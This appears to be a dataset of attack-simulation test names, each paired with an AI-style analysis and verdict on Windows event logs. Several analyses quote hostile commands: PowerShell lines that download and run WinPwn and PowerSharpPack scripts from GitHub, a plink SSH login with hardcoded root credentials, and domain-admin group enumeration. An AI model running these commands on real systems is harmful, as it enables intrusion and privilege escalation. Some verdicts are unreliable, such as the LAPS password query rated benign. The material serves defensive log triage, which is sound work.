  - It's vital to further evaluate the context: ascertain the origins of the security audit failures, check access logs for the 'admin_test' and 'SERVER002$' accounts, and ensure that process execution aligns with legitimate user activities. 
  - Investigate any additional logs or alerts that correspond to this timeframe for a more comprehensive picture.
  - Consider implementing enhanced monitoring on accounts flagged in these logs, evaluate the legitimacy of scripts or automated processes, and ensure all security patches are up-to-date. Possible configurations or services that could lead to these credential validation failures should also be inspected."
Get-EventLog To Enumerate Windows Security Log,"### Analysis of Windows Event Logs

Upon reviewing the provided logs, a few observations can be made regarding potential malicious behavior and anomalies:

#### Notable Security Logs

- **Event ID 4624 (Various) with Logon Type 5**: This logon type indicates that a service was started. It is common to see this when services start under the System account, as shown in the logs where the TargetUserName is ""SYSTEM"" using the Advapi logon process. These events alone do not indicate malicious activity.

- **Event ID 4672 - Special Privileges Assigned**: Events with this ID indicate that an account was assigned special access privileges at logon. The repeated occurrences for the SYSTEM user are generally consistent with automated system processes and do not necessarily indicate suspicious activity.

- **Event ID 5379 - Credential Manager Operations**: These events indicate attempts to retrieve a secret from the Credential Manager. The repeated attempts with a return code that indicates failure (`3221226021` means there are no credentials available) could suggest an automated process or script failed in accessing expected credentials. While these failures alone are not directly malicious, they warrant further examination to understand the context of the credential requests.

#### Sysmon Logs

- **PowerShell Execution (Events ID 1 and 5)**: Several instances of PowerShell were executed with command lines referencing security logs and encoding commands. The commands involved exporting the event logs, which could suggest either legitimate administrative tasks or reconnaissance activities. The encoded commands are particularly noteworthy and should be examined.

- **Frequent Execution of System Utilities Such as `whoami.exe`, `wevtutil.exe`, and PowerShell**: These utilities are often used in system diagnostics but can also be leveraged in malicious scripts to gather system information. The pattern of their usage should be assessed to understand whether it aligns with legitimate administrative tasks.

#### Windows PowerShell Logs

- **PowerShell Activity**: The logs confirm the execution of PowerShell scripts, with commands that manipulate event logs and potentially collect system information. The execution of encoded commands slots into common tactics used within attack vectors for data collection and enumeration.

#### Application Logs

- **No Suspicious Activities Detected**: The events captured in the Application logs appear routine, such as updates for system protection features and Windows Defender.

### Assessment & Resolution

The logs show signs of potentially suspicious activity, particularly the repeated access attempts to Credential Manager and encoded PowerShell commands. Without additional context, it is unclear whether these are legitimate administrative tasks or represent an initial stage of a compromise attempt.

Thus, the overall assessment of the situation leads to the resolution:

- **SUSPICIOUS**: The activities in the logs warrant further investigation, particularly around the PowerShell command usage and failed credential access attempts, to determine if they are associated with administrative actions or indicative of malicious behavior. Further steps might include examining data exports, scheduled tasks, user activity reviews, and correlating network traffic patterns with log times to identify the intent behind these activities."
Enumerate all accounts via PowerShell (Local),"After conducting a thorough review of the provided Windows event logs across various channels (System, Security, Sysmon, Windows PowerShell, and Application), I have identified several indications of potentially suspicious activity. Here's a detailed analysis:

### Key Observations:

#### 1. **System and Time Manipulation:**
- There are multiple entries related to time changes on the system. Such changes can sometimes indicate attempts to evade detection mechanisms that rely on system timestamps.
- Events showing time changes manipulated by `svchost.exe` could relate to legitimate time synchronization tasks, but they are often abused in malicious activities to alter log timestamps.

#### 2. **PowerShell Activity:**
- The logs show `PowerShell.exe` being executed with commands that involve querying user accounts (`net user`, `get-localuser`, `get-localgroupmember`) and listing credentials and user directories. Such actions are consistent with enumeration tactics used in reconnaissance phases of an attack.
- The frequency and the combination of commands are indicators of possible malicious use of PowerShell.

#### 3. **Security Log and Privilege Escalation:**
- Security events (ID 4799) indicate the use of the PowerShell process by the user `admin_test` to interact with high-privileged groups and accounts (""Administrators"", ""Device Owners"", etc.). This suggests attempts to manipulate or gain elevated access, which aligns with privilege escalation tactics.

#### 4. **Sysmon Process Creation:**
- The Sysmon logs display various command line tools like `whoami.exe`, `cmdkey.exe`, and `net.exe` being executed under high privileges by the same user, `admin_test`. The use of these tools for user and credential enumeration could indicate lateral movement or privilege escalation activities.
- The repeated invocation of `wevtutil.exe` suggests attempts to manage event logs, possibly to cover tracks of malicious activities.

#### 5. **Microsoft Edge Update:**
- Multiple process activities involve the Microsoft Edge Update processes, which appear legitimate as they are running under `NT AUTHORITY\SYSTEM`. This series of events is consistent with routine update checks and installations for Microsoft Edge, not typically linked with malicious activities.

### Assessment:

- **Process Execution Patterns**: The combination of PowerShell utilization for enumeration, suspicious manipulation of user group memberships, and potential log deletion or alteration attempts reflect tools and techniques used in advanced persistent threats (APT) or red team activities.
- **Event Manipulation**: Time and event log management activities coincide with avoiding detection by obscuring forensic evidence, a technique often employed by threat actors post-exploitation.

### Final Assessment: **SUSPICIOUS**

## Guidance on How to Proceed:
1. **Isolate the Host**: Since the behavior is suspicious but not explicitly confirmed malicious, isolate Server002 for a deeper analysis to prevent potential lateral movement.
2. **Conduct Memory Analysis**: Capture volatile data and analyze for signs of in-memory threats.
3. **Forensic Review**: Perform a thorough disk forensic analysis to scrutinize file system changes, new scripts, tools, or binaries unknown to the environment should be flagged and reviewed.
4. **Review User Accounts**: Investigate the account `admin_test` for abnormal password changes, unexpected logins, or privilege escalations.
5. **Log Review and Enhancement**: Examine and, if necessary, enhance logging around PowerShell execution and system changes to capture more context going forward.
6. **Evaluate Patch and Update Management Practices**: Investigate the legitimacy of recent software updates and scan for rogue updates potentially introducing further vulnerabilities or backdoors.

Ensure stakeholders are briefed on the situation and corresponding containment steps are swiftly implemented. Further investigation could potentially elevate this assessment to **MALICIOUS** if more concrete proof emerges."
Azure - Dump Subscription Data with MicroBurst,"Upon reviewing the provided logs, here are the key observations and analysis:

1. **Windows Update Activity (System Log)**: 
   - The logs show multiple Windows Update events, primarily dealing with app updates and package repositories. All events under the `Microsoft-Windows-WindowsUpdateClient` are standard update operations (EventID 44) and do not indicate malicious activities. The updates involve typical Microsoft products such as Microsoft Store, .NET, and other libraries.

2. **Security Log Activities**:
   - **EventID 4798 and 4799**: These indicate privilege enumeration and access checks. The events reflect standard operations and lack any signs pointing towards malicious privilege escalations or suspicious access.
   - **EventID 4624 - Successful Logons**: Logins using SYSTEM and administrative accounts are standard for system-level operations and maintenance tasks. They are expected on a server environment.
   - The `CompatTelRunner.exe` process is seen frequently, which is associated with Microsoft Compatibility Telemetry, a legitimate Windows process used to send technical data to Microsoft.

3. **Sysmon Log Analysis**:
   - Multiple processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `svchost.exe` seem to be invoked. The key observations relate to `powershell.exe` scripts executing from a user's temporary directory, using commands like `Get-AzDomainInfo.ps1`. This indicates the potential for PowerShell scripts to perform operations which need further scrutiny for malicious intent.
   - Usage of `PowerShell` with command lines and scripts from temporary directories, involving connection and credential management, are potentially suspicious, especially if unplanned or unknown.
   - `wevtutil.exe` invocation could imply attempts to manage event logs, which would be suspicious without administrative intent validation.

4. **Windows PowerShell Logs**:
   - The PowerShell logs show execution of scripts involving `Get-AzDomainInfo.ps1`. Although PowerShell is commonly used for both legitimate and malicious tasks, the context in which scripts are run — especially involving external files and service connections — implies further analysis is needed to rule out misuse.
   - The use of `ConvertTo-SecureString` and `PSCredential` indicates attempts at managing sensitive information which, without proper context, could be concerning. 

**Assessment & Resolution**:
- **SUSPICIOUS**: The combination of PowerShell script executions from unconventional paths, involvement of sensitive credential handling within scripts, and telemetry data usage suggests the need for further investigation. Specifically, a close examination of the intent and legitimacy of the PowerShell scripts and their execution context on `Server002` is crucial to rule out any disguised malicious activity.

**Guidance**:
- Confirm whether the PowerShell scripts are part of a legitimate administrative task or scheduled operation.
- Verify the legitimacy of any users or tasks that executed PowerShell commands from temporary directories.
- Review the updates or scripts for unexpected or unauthorized installations or command execution indicating potential compromise.
- If unapproved activities are confirmed, consider mitigation steps such as removing unauthorized scripts, reviewing user permissions, and conducting further forensic analysis if required."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"Upon reviewing the provided logs, there are several key observations that indicate potential malicious activity:

### Suspicious Observations:

1. **PowerShell Execution with Suspicious Command Line:**
   - The logs show an execution of `powershell.exe` with the following command:  
     ```
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
     ```
   - This command is using `Invoke-Expression (iex)` to download and execute a script from a remote URL. This is a known technique used by attackers to execute scripts remotely and can be indicative of a malicious attempt to run unauthorized code on the system.

2. **Process Creation and Execution:**
   - Multiple instances of processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` are executed under the user `SERVER002\\admin_test`.
   - The frequent invocation of `whoami` and `hostname`, as well as the use of `wevtutil.exe`, which is utilized to query and manage event logs, could be associated with reconnaissance activities typical in adversary behavior.

3. **High Integrity Level:**
   - The PowerShell scripts are being executed at a high integrity level, suggesting that the user has elevated privileges. This is concerning, especially if the script is malicious, as it would have unhindered access to perform actions on the system.

4. **Time Adjustment in System Logs:**
   - The kernel and security logs show a time adjustment for the system time. This could be a normal NTP synchronization, but in the context of other suspicious behavior, it may obscure time-related logging or monitoring activities.

### Indicators of Malicious Activity:

- The PowerShell command specifically downloads and potentially executes a script from the internet, which is highly indicative of an attempt to invoke remote execution capabilities. The script `Invoke-SharpUp.ps1` is known to be part of a penetration testing toolkit, which is not typically used in day-to-day operations.
- This behavior could be associated with a penetration testing or an actual malicious actor exploiting the system.

### Assessment:

Based on the occurrence of `PowerShell` commands downloading and executing scripts from a public GitHub repository and the contextual clues of process executions around this event, I deem these actions as **MALICIOUS**.

### Recommendations:

1. **Immediate Action:**
   - Quarantine the server `Server002` to prevent further potential exploitation or data exfiltration.
   - Disconnect the network access and perform a thorough malware analysis on the system.
   
2. **Investigate User Activity:**
   - Investigate the account `SERVER002\\admin_test` to ensure it was not compromised and check for recent access logs.

3. **Review and Revise Policies:**
   - Enhance monitoring for PowerShell activities such as remote script executions.
   - Restrict internet access for PowerShell and implement log monitoring for suspicious activities.

4. **Incident Response:**
   - Conduct a comprehensive incident response to understand the extent of the breach and identify other possibly affected systems.
   - Review security policies to prevent similar occurrences in the future.

This assessment concludes the logs present a high risk of malicious activity that should be addressed immediately to protect the environment."
Enumerate logged on users via CMD (Domain),"After an in-depth analysis of the provided Windows event logs, here are the findings for each log section:

**System Logs:**
- The System logs show several time synchronization events involving the Windows Time Service (e.g., svchost.exe). There is no immediate indication of any tampering or unusual behavior beyond time adjustments, often part of regular operations.

**Application Logs:**
- The logs contain entries for the ""Software Protection Platform Service"" (SPP) and ""edgeupdate"" services. The edgeupdate service was stopped multiple times. However, stopping these services does not inherently indicate malicious activity, as system updates and maintenance could cause such stops.

**Security Logs:**
- The Security logs indicate changes in system time by the `svchost.exe` process, mapped to the Local Service. These logs (EventID: 4616) are consistent with time synchronization activities and do not exhibit signs of malicious tampering.

**Sysmon Logs:**
- Repeated entries for `wevtutil.exe` and `conhost.exe`, executed by `SERVER002\admin_test`, might initially seem suspicious due to the frequency, but both are standard Windows tools, and no malicious command-line arguments are evident.
- Several Microsoft Edge Update related events (`MicrosoftEdgeUpdate.exe` and related processes) running as `NT AUTHORITY\SYSTEM`. These entries, while verbose, indicate routine update checks and installations for Microsoft Edge.

**Overall Assessment:**
- After a thorough review of the logs, the activities depicted appear routine or benign. The key areas, including time synchronization, application updates, and running of typical Windows processes like `svchost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`, do not show signs of overtly suspicious or malicious activities.
- Frequent process executions, especially Edge Update processes, align with the expected behavior in environments with regular software updates.
  
Given the lack of concrete evidence pointing to unusual or harmful actions within the data you provided, I conclude that the logs reflect:

**Resolution: BENIGN**

Recommendations:
1. Ensure your time synchronization settings conform to your organizational policies to avoid false-positive detections.
2. Continue regular monitoring with up-to-date threat detection tools to ensure early detection of any potential issues.
3. Consider adjusting your logging frameworks to better delineate between routine and potentially abnormal activities, providing clearer insights in future reviews."
WMIObject Group Discovery,"Upon reviewing the provided Windows event logs, I conducted a detailed analysis focusing on identifying any suspicious or anomalous activities:

### Windows PowerShell Log:
- **Observation**: Multiple PowerShell provider start events executed from the ConsoleHost using the `powershell.exe & {Get-WMIObject Win32_Group}` command.
- **Analysis**: The command `Get-WMIObject Win32_Group` is not inherently malicious; it is used to enumerate groups on a Windows system. However, frequent or unusual execution in specific contexts might raise suspicion, particularly if leveraged by unauthorized users or scripts.

### Sysmon Log:
- **Processes Observed**:
  - `whoami.exe`: Executed with high integrity, which is used to display the current user.
  - `conhost.exe`: Tied to several process creations, typically used by Windows Console Host.
  - `wevtutil.exe`: Processes observed, potentially indicative of log management or clearance.
  - `sppsvc.exe` and `TiWorker.exe`, and `TrustedInstaller.exe`: Considered normal Windows services related to system and updates management.
- **Analysis**: The execution of `whoami.exe` and other legitimate system tools like `conhost.exe` and `wevtutil.exe` can be part of regular system or admin tasks if expected in context. However, `wevtutil.exe` usage in quick succession might imply reconstruction or manipulation of event logs, raising possible concerns if unauthorized.

### Application Log:
- **Observation**: Singular event related to Software Protection Platform Service, which manages activation and licensing.
- **Analysis**: No suspicious activity detected from this log entry.

### Security Log:
- **Observation**: Logon events (4624, 4672) indicating privilege use by the user ""admin_test"" on SERVER002.
- **Analysis**: The user has special privileges (`SeDebugPrivilege`, etc.), which are typical for administrative accounts. However, ensuring these logons correspond with legitimate activity is crucial due to their elevated nature.

### Conclusion:
Overall, the logs show a sequence of PowerShell commands, normal system executable operations, and privileged logins by an administrative user. Without further context or deviation from regular activity patterns:
- **Resolution**: **SUSPICIOUS** - The activities captured don't immediately confirm malicious actions but indicate potential anomalous behavior that warrants further investigation. 

### Guidance on How to Proceed:
1. **Verify the Context**: Investigate whether the observed PowerShell and `wevtutil.exe` command executions are legitimate and expected. Discuss with system administrators to understand any maintenance or routine tasks performed around the logged times.
2. **User and Session Verification**: Confirm that the logged actions by ""admin_test"" align with expected user behavior and were authorized.
3. **Event Log Integrity**: Review if there are other logs or tools that might suggest event log modifications.
4. **Monitoring and Alerts**: Enhance monitoring to capture any further execution of sensitive commands or unusual system behavior.

Further analysis might necessitate a closer inspection of network activity, file modifications, and deeper user behavior assessments to rule out or confirm legitimate use."
Security Software Discovery - Windows Defender Enumeration,"### Detailed Analysis of Logs:

#### Windows PowerShell Log Analysis:
The PowerShell logs primarily involve the execution of a PowerShell script that checks the status of various security components like Windows Defender. The command used (`Get-Service WinDefend`, `Get-MpComputerStatus`, `Get-MpThreat`) is typically benign because it seems to assess the security status using native PowerShell commands.

- **Suspicious Behavior**: There is no inherently suspicious behavior in the provided PowerShell logs. The activity seems to be a routine check of the Windows Defender status using legitimate PowerShell cmdlets.

#### System Log Analysis:
The System logs indicate some time synchronization adjustments performed by the `svchost.exe` process. Time adjustments can be normal but need to be contextualized within broader system activity.

- **Suspicious Behavior**: The `svchost.exe` process is associated with time change events. Frequent or unexplained time changes could be suspicious if related to time-skew attacks or log manipulation, but this could be a normal synchronization event.

#### Security Log Analysis:
The Security logs mirror the System logs where `svchost.exe` is involved in a time change. This is consistent with changes observed in the System log.

- **Suspicious Behavior**: Despite the suspicious potential of time changes, given only one instance closely tied to routine system operations, it doesn't strongly indicate a compromise without further context.

#### Sysmon Log Analysis:
The Sysmon logs show routine operations by Microsoft Edge Update processes and some legitimate Windows command-line utilities like `whoami.exe`. 

- **Suspicious Behavior**: Frequent use of `conhost.exe` in relation to command execution could potentially hide activity, but without specific malicious commands, this is treated as low concern. Regular activities of `MicrosoftEdgeUpdate.exe` processes indicate software maintenance routines.

#### Application Log Analysis:
The Application logs mention the stopping of services related to `edgeupdate`, which is consistent with the update process of Microsoft Edge.

### Threat Assessment and Conclusion:

- **BENIGN Activity**: The observed activities in the logs indicate normal system behavior and maintenance operations. The checks on Windows Defender status, the usual time synchronization, and the presence of Windows system utilities and software updates suggest legitimate administrative or routine operations.
  
- **Resolution**: **BENIGN** - Based on the analysis, the logs contain benign activity with no clear indicators of compromise. However, continued monitoring is recommended to detect any abnormal patterns if they arise in subsequent log entries.

### Guidance on How to Proceed:
- Monitor for repeated and unexplained time changes as they can be indicative of more complex attacks.
- Verify that the PowerShell command used aligns with the intended IT security policy, as sometimes legitimate commands can be used with malicious intent if executed by unauthorized users.
- Ensure proper auditing and logging are configured, enabling quick detection and response should similar patterns emerge in contexts that may indicate compromise in the future."
Basic Permission Groups Discovery Windows (Domain),"Upon reviewing the provided Windows event logs, several points of interest and potentially concerning activities stand out:

1. **Frequent Execution of Windows Utilities:**
   - There are frequent executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\\admin_test`. These utilities are legitimate Windows administrative tools but can be used by attackers for reconnaissance and manipulation.
   - The command `whoami.exe` is typically used to display user information, which might indicate an effort to discover the current user context.

2. **Command Execution with Elevated Privileges:**
   - The log indicates a high integrity level, suggesting that processes are being executed with elevated privileges. This includes `cmd.exe` executing administrative commands like:
     ```
     cmd.exe /c net localgroup & net group /domain & net group ""enterprise admins"" /domain & net group ""domain admins"" /domain
     ```
   - This command sequence queries sensitive group memberships and could be an indication of reconnaissance activity or privilege escalation attempts.

3. **Pattern of Commands Related to ""Net"" Commands:**
   - The sequence of commands using `net.exe` and `net1.exe` executed in rapid succession also suggests enumeration of group memberships. While this could be part of legitimate administrative activity, it is a common action performed by attackers during lateral movement or account enumeration.

4. **Absence of PowerShell Activity:**
   - The PowerShell log is empty, which might not be directly concerning but is noteworthy as PowerShell is a common tool for administrative and malicious activities alike. Its absence could indicate an attempt to bypass logging by using alternative commands and utilities.

5. **Log Timestamps:**
   - The activities are occurring within a very tight timeframe around 13:00:37 and are executed with a specific user account, which could indicate automated scripting or batch processing.

6. **Time Synchronization Events:**
   - The System log records time synchronization with an NTP server (`time.windows.com`). This action alone isn't suspicious unless it could be tied to time manipulation attempts, but in this context, there is no direct indication of malicious intent connected with this.

**Assessment:**
The observed activities, particularly those involving command-line executions querying domain admin and enterprise admin groups, warrant further investigation. Although these actions are not definitively malicious without additional context, they are indicative of behavior typically associated with reconnaissance or privilege escalation attempts.

**Resolution: SUSPICIOUS**
The activities described in the logs are suspicious. Further investigation should be carried out to determine the legitimacy of the actions observed. Consider reviewing:
- The context for the `admin_test` user activities. Investigate if these are routine administrative tasks.
- Any corresponding logs that could indicate unauthorized access or privilege escalation attempts.
- Other security solutions in place (like EDR) for additional insights or alerts around these activities.

**Guidance:**
- Confirm the legitimacy of the `admin_test` user and their usage of administrative tools.
- Reach out to user `admin_test` for clarification if required.
- Retain heightened monitoring of this host for any new or escalating activities.
- If possible, perform a deeper dive into network logs to see if there are corresponding activities concerning this behavior.
"
ESXi - Enumerate VMDKs available on an ESXi Host,"After an in-depth analysis of the provided Windows event logs, I've identified several items that require further investigation:

1. **Frequent Execution of Common Utilities**: There are multiple instances of system utilities like `whoami.exe`, `hostname.exe`, `cmd.exe`, and `wevtutil.exe` being executed. While these processes can be standard, their frequent and rapid execution in a short time span may indicate script or batch file execution that could be automating a series of tasks.

2. **Command-Line Execution with Sensitive Information**: Notably, there's a command involving `cmd.exe` that uses `plink.exe` for SSH access with hardcoded credentials (`-l ""root"" -pw ""pass""`), which is highly unusual and can be a sign of an unauthorized attempt to access or control resources remotely. The use of such credentials in a script run on a server is a serious security concern.

3. **Execution of `plink.exe`**: `Plink.exe` is part of the PuTTY suite and is utilized for SSH tunneling and command execution. Its execution in conjunction with the aforementioned command line is suspicious, especially when it's initiated from unexpected directories like `C:\Users\ADMIN_~1\AppData\Local\Temp\`.

4. **Edge Update Process**: Microsoft's Edge Update processes are running, which on their own are typical for system maintenance. However, the process originates from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUB2AC.tmp\\`), which is unusual and might suggest tampering or a potential attempt to disguise malicious activity as legitimate system operations.

5. **High-Integrity Level Execution**: Many processes are running at a high integrity level, suggesting they have significant permissions. This includes several benign Microsoft processes, but in conjunction with suspicious activity, it can raise concerns regarding privilege misuse.

Given these observations, the activities outlined in these logs do not conclusively confirm malicious intent, but they exhibit behaviors that are not typical for a standard operational environment and warrant further investigation.

**Resolution:** SUSPICIOUS

**Guidance on how to proceed:**
- **Immediate Review and Investigation:** Investigate the origin of the `cmd.exe` command involving `plink.exe`, including the legitimacy of the script and the intent behind using those credentials.
- **Credentials and Access Review:** Review and potentially reset credentials if it appears there has been unauthorized use.
- **Scan for Malware:** Run an anti-malware scan on the system to detect any potentially unwanted or harmful software.
- **Baseline Comparison:** Compare these logs against the normal baseline activities for this system to provide further context on anomalies.
- **Review System Integrity and Configuration:** Check the configuration of the system settings and installed applications for consistency and any unauthorized changes.
- **Audit and Secure Logging Configuration:** Ensure audit logs are securely configured to capture critical activities for any future investigations.

These steps should assist in determining if these activities are the result of malicious actions or benign but misconfigured processes."
WinPwn - spoolvulnscan,"### Detailed Analysis of Logs

#### Sysmon Logs
- We see multiple executions of `wevtutil.exe` and `conhost.exe`, both under the user `SERVER002\admin_test`. These appear routine as `wevtutil.exe` can be used for querying and configuring event logs, and `conhost.exe` is a normal part of command executions on Windows.

- The critical observation is the PowerShell process (`powershell.exe`) with command-line arguments downloading a script from an external URL:
  ```plaintext
  ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), spoolvulnscan -noninteractive -consoleoutput}
  ```
  This usage of `Invoke-Expression (iex)` in PowerShell to download and execute a potential script from a GitHub repository is an immediate red flag for malicious activity. The execution seems to relate to scripts supposedly for security audit or exploitation.

#### Security Logs
- Events related to time synchronization (Event ID 4616) show no anomalies directly indicating interference or manipulation in the context of security events.

#### Windows PowerShell Logs
- Multiple entries (Event ID 600 and 400) show the consistent downloading and attempted execution of scripts from an external source using similar command strings as logged by Sysmon.

#### Application Logs
- Windows Defender is running and has reported being enabled (Event ID 15). However, its state might not be enough since the suspicious PowerShell activity occurred.

#### System Logs
- Time synchronization events (Event ID 1 and 24) occur, but there is no direct correlation or clear manipulation other than routine time updates.

### Assessment

The PowerShell activity observed is highly suspicious. The behavior of downloading scripts from an external source (GitHub) and execution using `iex` is characteristic of malicious operations such as lateral movement, data exfiltration, or unauthorized access attempts. This pattern is typical in various attack frameworks, including penetration testing tools or actual cyber threats.

**Conclusion: MALICIOUS**

### Recommendation

- **Immediate Incident Response:**
  - **Containment:** Isolate the affected host `Server002` from the network immediately to prevent further activity.
  - **Eradication:** Investigate if any payloads were delivered through the executed script. Remove malicious or unknown files and scripts.
  - **Recovery:** Restore the system from a safe backup made before this suspicious activity occurred, if available.

- **Further Investigation Required:**
  - Conduct a detailed forensic analysis to determine if the downloaded script executed successfully and its impact.
  - Review additional logs for other endpoints to check for propagation or similar activity.
  
- **Strengthen Security Posture:**
  - Implement stricter PowerShell execution policies and consider disabling `iex` if not used in approved workflows.
  - Enforce robust endpoint protection systems to detect such tools and patterns.

- **Report to Security Team:**
  - Document all findings and actions taken for future reference and compliance considerations.
"
Enumerate COM Objects in Registry with Powershell,"Upon examining the provided event logs, the following analysis of specific events has been made:

### System Log:
- The system log primarily contains events related to the Windows Update process, which appear normal and expected behavior for a system updating Microsoft Defender Antivirus signatures.

### Security Log:
- Event ID 4624 (An account was successfully logged on) and Event ID 4672 (Special privileges assigned to new logon) indicate regular system activities performed under the SYSTEM account. These logs are typical for a server setup that is managed and maintained.
- Several Event ID 5379 logs appear repeatedly with various Microsoft and Windows Live account accesses, indicating a failed attempt to read certain credentials with a return code `3221226021`, which indicates ""STATUS_OBJECT_NAME_NOT_FOUND."" This could be due to attempts to access non-existent credential objects, which might be due to system errors or misconfigurations, not necessarily malicious activities.

### Application Log:
- The application log entries show updates and security protection updates, which seem routine and not indicative of any compromise.

### Windows PowerShell Log:
- The PowerShell logs show entries indicating the execution of scripts related to registry access and manipulation. The command lines indicate operations on the registry but do not inherently point to malicious activity. However, since it involves registry manipulation without clear context or administrative approval, it merits further investigation to ensure the scripts were executed by an authorized user or process.

### Sysmon Log:
- Several processes such as `wevtutil.exe` and `conhost.exe` were executed by the `admin_test` user, showing administrative activities which may need review to confirm they are legitimate.
- The presence of PowerShell scripts manipulating registry entries and objects by creating instances may suggest an attempt at enumeration or exploitation, but without more details, this alone cannot be conclusively determined as malicious.
- Other entries like `wuauclt.exe`, `svchost.exe`, and `MpSigStub.exe` demonstrate standard system tasks related to updates and services.
- In particular, the PowerShell execution involving registry enumeration deserves more scrutiny, as it can indicate potential reconnaissance.

### Assessment:
The logs primarily consist of typical system activities related to updates and some administrative PowerShell activities. The current analysis yields no definitive evidence of compromise, but certain events, particularly the PowerShell activity involving registry manipulation, stand out as potentially suspicious.

### Resolution:
**SUSPICIOUS** - The registry-related PowerShell activity needs further investigation to ensure it’s part of legitimate administrative tasks. Additionally, the patterns of failed access attempts to MicrosoftAccount and WindowsLive credentials should be reviewed to rule out any misconfigurations or potential brute-force attempts. I recommend conducting a thorough review of activities performed by the `admin_test` account and validating PowerShell scripts for authorized usage.
"
Windows MachineGUID Discovery,"Upon examining the provided event logs, the following points have been observed:

1. **Process Execution Patterns:**
   - The execution of legitimate Windows processes like `whoami.exe`, `cmd.exe`, `reg.exe`, `wevtutil.exe`, and `hostname.exe` is noted, all run by `SERVER002\admin_test`. The execution of these programs is not inherently suspicious as they are standard Windows utilities. However, excessive or unusual usage can sometimes indicate malicious intent.
   - The command-line command `cmd.exe /c REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid` is benign in isolation, but repeated or automated registry queries could suggest reconnaissance activity.

2. **Privilege Level:**
   - The integrity level for all significant processes is high, suggesting administrative privileges were in use, which should be monitored closely, especially in unexpected or unauthorized contexts.

3. **Time Manipulation Events:**
   - Multiple events (Event ID: 4616) indicate a time change on the system via the `svchost.exe` process. Event logs show that the system time was set back or forward, which often happens during legitimate activities such as synchronization with time servers or system updates, but can also be an indicator of an attempt at log tampering in malicious activities.

4. **Parent-Child Process Relationships:**
   - The legitimate process `wsmprovhost.exe` acts as a parent to many command executions. This is typical behavior during remote management via Windows Remote Management (WinRM), but should be verified if it was an expected activity from the `admin_test` user at the time.

5. **Anomalous Behavioral Observations:**
   - Frequent console host (conhost.exe) processes indicate command-line activity, typically aligned with running console-based utilities. Such activity should be contextualized within typical user behavior to detect anomalies.

6. **External Connections:**
   - No specific entries indicate unusual network connections or active external command-and-control activities, focusing the investigation internally.

**Assessment:**

- **Potential Reconnaissance:**
  The usage of `whoami.exe` along with querying the registry for specific machine GUID values could suggest information gathering, which is typical in the reconnaissance phase of an attack.

- **Time Modification Concerns:**
  The time modification events stand out as noteworthy and could be associated with attempts to obscure event log evidence, needing further investigation to rule out tampering.

Based on these observations, the logs overall don't definitively prove malicious activity but present specific aspects that are unusual or warranted additional scrutiny. Thus, the logs are best categorized as **SUSPICIOUS**.

**Guidance:**
- Perform an integrity check on systems logs to ensure no records were altered, correlate these activities with user actions or expected business processes.
- Verify with the user/reporting mechanism for intent behind these actions, especially regarding the elevated privileges used.
- Implement enhanced monitoring and alerting for activities involving administrative commands and time changes.

Consider moving forward with a detailed forensic analysis if these actions were not authorized or expected in regular system use contexts."
Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"Upon reviewing the provided Windows event logs, let's analyze and classify the activity:

### System Log Analysis

1. **Event ID 24 and 1 (Microsoft-Windows-Kernel-General)**
   - Observations: These events relate to system time changes, showing adjustments to the system clock. The adjustments go from ""2024-10-23 21:51:42.1578330"" to ""2024-10-23 21:51:40.1616824"".
   - Analysis: Time changes can sometimes indicate malicious activity, particularly if done outside of scheduled maintenance windows. However, the process responsible is `svchost.exe`, a legitimate system process, and `Microsoft-Windows-Time-Service` references time synchronization using `time.windows.com`.

### Security Log Analysis

1. **Event ID 4616 (Microsoft-Windows-Security-Auditing)**
   - Observations: These logs confirm the time adjustments executed by the system service `svchost.exe` under the `LOCAL SERVICE` account.
   - Analysis: This correlates with the observed time changes in system logs and is handled by a system service, suggesting routine time synchronization rather than unauthorized changes.

### Windows PowerShell Log Analysis

1. **PowerShell Command Execution**
   - Observations: PowerShell is executed with a specific command to get AD computer properties: `Get-ADComputer $env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime`.
   - Analysis: This is a legitimate administrative command to query AD computer properties, particularly related to Local Admin Password Solution (LAPS). The context suggests it could be routine for system administration.

### Sysmon Log Analysis

1. **Process Activity**
   - Observations: Several processes like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `conhost.exe`, and `MicrosoftEdgeUpdate.exe` are observed. Notably, admins run `whoami.exe` and `hostname.exe`, common administrative and diagnostic tools.
   - Analysis: The presence of `MicrosoftEdgeUpdate.exe` in various contexts shows continuous Microsoft Edge updates. The administrative tools used are consistent with regular administrative tasks.

2. **Observation of Edge Update**
   - Observations: `MicrosoftEdgeUpdate.exe` processes are executing multiple times.
   - Analysis: The logs record ongoing service and process executions consistent with normal update behavior.

### Application Log Analysis

- Observations: References `edgeupdate`, with messages like ""Service stopped"", confirming cessation of update services.
- Analysis: It aligns with expected Edge update activities, signaling the ending of update services post-process completion.

### Conclusion and Resolution

From the log entries analyzed:

- The time changes appear routine, triggered by system utilities for time synchronization.
- PowerShell activities relate to legitimate administrative commands, likely part of an AD management task.
- Sysmon recorded legitimate administrative and diagnostic commands and Edge updates.
- No definitive signs of privilege escalation, unauthorized access, or suspicious command-line arguments indicative of malicious activity.

Therefore, the logs reveal processes and activities that are consistent with legitimate administrative and system maintenance tasks. Based on the analysis, the resolution is:
- **BENIGN** - if logs contain benign activity.

### Guidance

1. Ensure time synchronization settings are explicitly defined to avoid concerns about unexpected time adjustments.
2. Regularly audit PowerShell usage and ensure it aligns with your organization’s operational policy.
3. Monitor update mechanisms like Microsoft Edge for regular update patterns and discrepancies.
4. Maintain logging and monitoring to quickly identify any deviations in system and user activities in future audits."
